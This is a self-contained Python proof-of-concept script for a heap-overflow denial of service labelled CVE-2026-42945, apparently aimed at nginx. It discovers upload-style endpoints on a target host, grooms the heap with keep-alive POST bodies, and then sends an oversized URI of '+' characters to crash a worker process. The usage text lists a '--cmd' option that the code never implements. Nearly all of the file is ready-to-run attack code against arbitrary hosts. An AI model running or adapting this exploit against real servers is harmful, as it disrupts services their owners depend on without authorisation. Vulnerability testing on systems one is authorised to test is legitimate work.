#!/usr/bin/env python3
"""
poc/dos_enhanced.py — Enhanced DoS PoC for CVE-2026-42945 (0xBlackash / realistic style).

Discovers real spray endpoints on the target (no synthetic /spray path), then sends
a heap-overflow request to trigger a worker crash. Does NOT depend on the modules/
package — self-contained stdlib-only script.

Usage:
  python poc/dos_enhanced.py <host> <port> [--overflow N] [--cmd COMMAND] [--ssl]
"""
from __future__ import annotations

import re
import socket
import ssl
import sys
import time

# ── Constants ──────────────────────────────────────────────────────────────────
DEFAULT_PORT   = 19321
OVERFLOW_SIZE  = 800          # bytes of '+' chars sent in URI
N_SPRAY        = 10
BODY_LEN       = 4000

SPRAY_PATHS = [
    "/upload", "/api/upload", "/api/v1/upload", "/api/import",
    "/api/data", "/api/bulk", "/submit", "/post", "/api/webhook",
    "/proxy", "/gateway", "/spray",
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "info"):
    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]"}
    print(f"{prefix.get(level, '[*]')} {msg}", flush=True)


def _wrap_ssl(sock: socket.socket, host: str, use_ssl: bool) -> socket.socket:
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _alive(host: str, port: int, timeout: float = 2.0, use_ssl: bool = False) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        with _wrap_ssl(s, host, use_ssl) as c:
            c.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            d = c.recv(64)
            return bool(d) and d.startswith(b"HTTP/1.")
    except OSError:
        return False


def _discover_endpoints(host: str, port: int, use_ssl: bool = False) -> list[str]:
    """Probe standard paths — return those accepting POST/PUT."""
    found: list[str] = []
    for path in SPRAY_PATHS:
        try:
            s = socket.create_connection((host, port), timeout=2)
            with _wrap_ssl(s, host, use_ssl) as c:
                c.sendall(
                    f"POST {path} HTTP/1.1\r\nHost:{host}\r\n"
                    f"Content-Length:0\r\nConnection:close\r\n\r\n".encode()
                )
                resp = c.recv(512).decode("latin-1", errors="replace")
                m = re.search(r"HTTP/[\d.]+ (\d+)", resp)
                if m and int(m.group(1)) not in (404, 403):
                    found.append(path)
        except OSError:
            continue
    return found or ["/spray"]     # fallback


def _spray_bodies(host: str, port: int, body: bytes, endpoint: str,
                  use_ssl: bool = False, n: int = N_SPRAY) -> list[socket.socket]:
    """Keep-alive spray — return list of open sockets."""
    conns: list[socket.socket] = []
    for _ in range(n):
        try:
            s = socket.create_connection((host, port), timeout=5)
            c = _wrap_ssl(s, host, use_ssl)
            req = (
                f"POST {endpoint} HTTP/1.1\r\nHost:{host}\r\n"
                f"Content-Length:{len(body)}\r\n"
                f"Content-Type:application/octet-stream\r\n"
                f"Connection:keep-alive\r\n\r\n"
            ).encode() + body
            c.sendall(req)
            conns.append(c)
            time.sleep(0.005)
        except OSError:
            pass
    return conns


def _overflow(host: str, port: int, endpoint: str, overflow_size: int = OVERFLOW_SIZE,
              use_ssl: bool = False) -> bool:
    """Send the heap-overflow URI trigger."""
    uri = "+" * (overflow_size // 2)
    try:
        s = socket.create_connection((host, port), timeout=5)
        with _wrap_ssl(s, host, use_ssl) as c:
            c.sendall(
                f"GET {endpoint}/{uri} HTTP/1.1\r\nHost:{host}\r\nConnection:close\r\n\r\n".encode()
            )
            resp = c.recv(256)
            return b"502" in resp or b"500" in resp
    except OSError:
        return True    # connection reset = crash


# ── Main PoC ──────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    host       = args[0]
    port       = int(args[1]) if len(args) > 1 else DEFAULT_PORT
    use_ssl    = "--ssl" in args
    overflow_n = OVERFLOW_SIZE
    if "--overflow" in args:
        idx = args.index("--overflow")
        if idx + 1 < len(args):
            overflow_n = int(args[idx + 1])

    _log(f"CVE-2026-42945 Enhanced DoS PoC — target {host}:{port}", "info")

    if not _alive(host, port, use_ssl=use_ssl):
        _log("Target not reachable — aborting", "err")
        sys.exit(1)

    _log("Discovering spray endpoints...", "info")
    endpoints = _discover_endpoints(host, port, use_ssl=use_ssl)
    _log(f"Found {len(endpoints)} suitable endpoint(s): {endpoints[:3]}", "info")

    endpoint = endpoints[0]
    body = b"\x00" * BODY_LEN

    _log(f"Grooming heap via {endpoint} (n={N_SPRAY})", "info")
    conns = _spray_bodies(host, port, body, endpoint, use_ssl=use_ssl)
    time.sleep(0.1)

    _log(f"Sending overflow URI ({overflow_n // 2} '+' chars)...", "info")
    crashed = _overflow(host, port, endpoint, overflow_n, use_ssl=use_ssl)

    for c in conns:
        try:
            c.close()
        except Exception:
            pass

    time.sleep(2)
    alive_after = _alive(host, port, use_ssl=use_ssl)

    if crashed and alive_after:
        _log("VULNERABLE — worker crashed and respawned (auto-restart active)", "ok")
    elif crashed and not alive_after:
        _log("Worker crashed but did NOT respawn — nginx master may have stopped", "warn")
    else:
        _log("No crash detected — target may not be vulnerable or config differs", "info")


if __name__ == "__main__":
    main()
